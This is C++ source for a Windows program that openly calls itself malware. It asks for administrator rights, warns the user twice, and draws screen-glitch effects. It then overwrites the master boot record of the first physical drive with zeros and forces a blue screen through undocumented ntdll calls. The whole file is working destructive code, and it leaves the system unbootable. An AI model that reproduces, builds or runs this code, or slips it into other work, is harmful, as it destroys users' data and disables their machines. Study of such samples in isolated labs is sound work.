#include <windows.h>
#include <thread>
#include <random>
#include <array>
#include <string>
#include <vector>
#include <winioctl.h>
#include <shlobj.h>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")

// size of mbr
const unsigned char bootsec[512] = { 0x00 };

typedef NTSTATUS(NTAPI* RtlAdjustPrivilegePtr)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

typedef NTSTATUS(NTAPI* NtRaiseHardErrorPtr)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response
);

void warn();
void hidden();
bool checkad();
void relaunch();
void screen();
void fuckmbr();
void bsod();

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!checkad()) {
        hidden();
        warn();
        relaunch();
        return 0;
    }

    hidden();
    std::thread t1(screen);
    t1.join();
    fuckmbr();
    bsod();
    return 0;
}

// hides cmd
void hidden() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

// visual effects, cuz cool.
void screen() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HFONT hFont = CreateFontW(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
    SelectObject(hdc, hFont);
    std::default_random_engine gen(GetTickCount());
    std::uniform_int_distribution<int> dist(0, sh / 2);
    std::uniform_int_distribution<int> offset(-20, 20);
    std::uniform_int_distribution<int> height(20, sh / 2);
    std::uniform_int_distribution<int> xPos(0, sw - 100);
    std::uniform_int_distribution<int> yPos(0, sh - 50);
    std::uniform_int_distribution<int> color(0, 0xFFFFFF);
    std::uniform_int_distribution<int> numTexts(10, 15);
    int numTextInstances = numTexts(gen);
    auto start = GetTickCount();
    while (GetTickCount() - start < 10000) {
        SetBkMode(hdc, TRANSPARENT);
        std::wstring text = L"lowp.exe";
        for (int i = 0; i < numTextInstances; ++i) {
            SetTextColor(hdc, color(gen));
            TextOutW(hdc, xPos(gen), yPos(gen), text.c_str(), text.length());
        }
        for (int i = 0; i < 10; i++) {
            int y = dist(gen);
            int o = offset(gen);
            int h = height(gen);
            int ny = (y + o) % sh;
            BitBlt(hdc, 0, y, sw, h, hdc, 0, ny, SRCCOPY);
            if (rand() % 3 == 0) {
                BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
            }
            Sleep(10);
        }
    }
    SelectObject(hdc, GetStockObject(SYSTEM_FONT));
    DeleteObject(hFont);
    ReleaseDC(hwnd, hdc);
}

// overwrites mbr with 512 0's
void fuckmbr() {
    HANDLE dev = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (dev != INVALID_HANDLE_VALUE) {
        DWORD written;
        SetFilePointer(dev, 0, NULL, FILE_BEGIN);
        WriteFile(dev, bootsec, 512, &written, NULL);
        CloseHandle(dev);
    }
}

// triggers bsod
void bsod() {
    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
    RtlAdjustPrivilegePtr RtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    NtRaiseHardErrorPtr NtRaiseHardError = (NtRaiseHardErrorPtr)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN b;
        ULONG r;
        RtlAdjustPrivilege(19, TRUE, FALSE, &b);
        NtRaiseHardError(0xC0000420, 0, 0, 0, 6, &r);
    }
    FreeLibrary(hNtdll);
}

// warning
void warn() {
    std::wstring warning1 = L"Hey there!\n\nThe code you just executed is malware, so if you do not wish to proceed executing this code, press 'No' and nothing will happen.\nBut if you insist, press 'Yes'.\nPlease make sure that you are in a controlled environment.\n(a VM for example).";
    std::wstring warning2 = L"Are ya really sure?\nThis will render the system unbootable!";
    std::wstring title = L"Warning";
    std::wstring lastTitle = L"Last warning";
    int res = MessageBoxW(NULL, warning1.c_str(), title.c_str(), MB_ICONWARNING | MB_YESNO);
    if (res == IDNO) {
        exit(0);
    }
    res = MessageBoxW(NULL, warning2.c_str(), lastTitle.c_str(), MB_ICONINFORMATION | MB_YESNO);
    if (res == IDNO) {
        exit(0);
    }
}

// check admin
bool checkad() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// relaunch with admin perms
void relaunch() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, ARRAYSIZE(szPath));
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = szPath;
    sei.nShow = SW_SHOWNORMAL;
    ShellExecuteExW(&sei);
}
